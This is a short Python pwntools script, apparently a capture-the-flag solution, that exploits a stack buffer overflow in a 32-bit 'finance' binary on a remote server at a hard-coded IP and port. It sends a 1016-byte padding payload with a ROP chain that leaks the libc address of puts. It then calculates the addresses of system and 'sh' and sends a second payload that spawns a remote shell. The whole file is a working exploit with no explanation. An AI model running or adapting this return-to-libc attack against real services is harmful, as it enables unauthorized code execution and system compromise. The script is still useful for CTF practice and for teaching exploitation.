from pwn import *

e = ELF("./finance")
libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
context.binary = e

r = remote("35.240.148.138",5003)
#r = process([e.path])

popebp_ret = 0x804889b

r.sendlineafter('choice: ','2')
payload = b'A'*1016 + p32(e.plt['puts']) + p32(popebp_ret) + p32(e.got['puts']) + p32(e.symbols['main'])
r.sendlineafter(': ',payload)
r.recvline()
r.recvline()
puts_leak = u32(r.recvline()[:4])
baseaddr = puts_leak - libc.symbols['puts']
system = baseaddr + libc.symbols['system']
binsh = baseaddr + next(libc.search(b'sh\x00'))
r.sendlineafter('choice: ','2')
payload = b'A'*1016 + p32(system) + p32(popebp_ret) + p32(binsh)
r.sendlineafter(': ',payload)
r.interactive()